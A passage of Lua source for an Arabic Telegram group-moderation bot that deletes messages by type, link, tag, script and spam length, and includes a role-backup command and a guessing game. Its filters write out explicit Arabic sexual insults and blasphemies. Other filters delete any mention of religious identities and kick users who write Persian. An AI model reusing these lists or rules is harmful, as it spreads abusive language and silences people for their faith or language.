if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--     Source Selaa     --
--         Voice          --
elseif msg_type == 'MSG:Voice' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Voice]")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--     Source Selaa     --
--        Location        --
elseif msg_type == 'MSG:Location' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Location]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Location]")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--     Source Selaa     --
--         Video          --
elseif msg_type == 'MSG:Video' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Video]")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--     Source Selaa     --
--          Gif           --
elseif msg_type == 'MSG:Gif' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Gif] ")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--     Source Selaa     --
--         Text           --
elseif msg_type == 'MSG:Text' then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link]")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Text]")
end
if msg.content_.text_:match("@") then
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local abs = 'Selaa:Spam:Text'..msg.chat_id_
if not Selaa:get(Selaa..abs) then
sens = 400
else
sens = tonumber(Selaa:get(Selaa..abs))
end
if Selaa:get(Selaa..'Selaa:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Text]")
end
end
end
--     Source Selaa     --
if Selaa:get(Selaa.."Selaa:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"↯☆تم الغاء حفظ الرابط")       
Selaa:del(Selaa.."Selaa:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
Selaa:set(Selaa.."Selaa:Groups:Links"..msg.chat_id_,Link)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ الرابط بنجاح', 1, 'md')
Selaa:del(Selaa.."Selaa:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end
--     Source Selaa     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if Selaa:get('SelaaTEAM:'..Selaa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Selaa:del('SelaaTEAM:'..Selaa..'id:user'..msg.chat_id_)  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء الامر', 1, 'md')
Selaa:del('SelaaTEAM:'..Selaa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Selaa:del('SelaaTEAM:'..Selaa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = Selaa:get('SelaaTEAM:'..Selaa..'id:user'..msg.chat_id_)  
Selaa:incrby(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Selaa(msg.chat_id_, msg.id_,  1, "↯☆تم اضافة "..numadded..' رساله', 1, 'md')
Selaa:del('SelaaTEAM:'..Selaa..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if Selaa:get('SelaaTEAM:'..Selaa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Selaa:del('SelaaTEAM:'..Selaa..'ids:user'..msg.chat_id_)  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء الامر', 1, 'md')
Selaa:del('SelaaTEAM:'..Selaa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Selaa:del('SelaaTEAM:'..Selaa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = Selaa:get('SelaaTEAM:'..Selaa..'ids:user'..msg.chat_id_)  
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Selaa(msg.chat_id_, msg.id_,  1, "↯☆تم اضافة "..numadded..' نقطه', 1, 'md')
Selaa:del('SelaaTEAM:'..Selaa..'ids:user'..msg.chat_id_)  
end
end
--     Source Selaa     --
if text:match("طيز") or text:match("ديس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") then
if not Selaa:get(Selaa.."Selaa:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا عزيزي ⇇ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'sourcesela')..') \n↯☆ممنوع الفشار في المجموعه', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source Selaa     --
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if Selaa:get(Selaa.."Selaa:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا عزيزي ⇇ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'sourcesela')..') \n↯☆ممنوع التكلم بالغه الفارسيه هنا', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if Selaa:get(Selaa.."Selaa:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
--     Source Selaa     --
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
if not Selaa:get(Selaa.."Selaa:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا عزيزي ⇇ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'sourcesela')..') \n↯☆ممنوع الكفر في المجموعه', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source Selaa     --
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
if not Selaa:get(Selaa.."Selaa:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا عزيزي ⇇ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'sourcesela')..') \n↯☆ممنوع التكلم بالطائفيه هنا', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source Selaa     --
if Sudo(msg) then
if text == 'جلب نسخه الجروبات' and SourceCh(msg) or text == 'جلب نسخه احتياطيه' and SourceCh(msg) then
local list = Selaa:smembers(Selaa..'Selaa:Groups') 
local BotName = (Selaa:get(Selaa.."Selaa:NameBot") or 'سيلا')
local GetJson = '{"BotId": '..Selaa..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(list) do 
LinkGroups = Selaa:get(Selaa.."Selaa:Groups:Links"..v)
Welcomes = Selaa:get(Selaa..'Selaa:Groups:Welcomes'..v) or ''
SelaaConstructors = Selaa:smembers(Selaa..'Selaa:SelaaConstructor:'..v)
Constructors = Selaa:smembers(Selaa..'Selaa:BasicConstructor:'..v)
BasicConstructors = Selaa:smembers(Selaa..'Selaa:Constructor:'..v)
Managers = Selaa:smembers(Selaa..'Selaa:Managers:'..v)
Admis = Selaa:smembers(Selaa..'Selaa:Admins:'..v)
Vips = Selaa:smembers(Selaa..'Selaa:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #SelaaConstructors ~= 0 then
GetJson = GetJson..'"SelaaConstructors":['
for k,v in pairs(SelaaConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..Selaa..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Selaa..'.json', '↯☆يحتوي الملف على ⇇ '..#list..' مجموعه',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.reply_to_message_id_) > 0 or text == 'رفع النسخه الاحتياطيه' and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source Selaa     --
if Selaa:get(Selaa.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Selaa( msg.chat_id_, msg.id_, 1,"↯☆يوجد فقط ( 6 ) اختيارات\n↯☆ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = Selaa:get(Selaa.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
Selaa:del(Selaa.."SET:GAME"..msg.chat_id_)   
Selaa( msg.chat_id_, msg.id_, 1,'↯☆*المحيبس باليد رقم* ⇇ '..NUM..'\n↯☆*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Selaa:del(Selaa.."SET:GAME"..msg.chat_id_)   
Selaa( msg.chat_id_, msg.id_, 1,'↯☆*المحيبس باليد رقم* ⇇ '..GETNUM..'\n↯☆*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if Selaa:get(Selaa..'Selaa4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "↯☆تم الغاء الامر")
Selaa:del(Selaa..'Selaa4'..msg.sender_user_id_)
return false  end 
Selaa:del(Selaa..'Selaa4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '↯☆المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '↯☆عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '↯☆عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
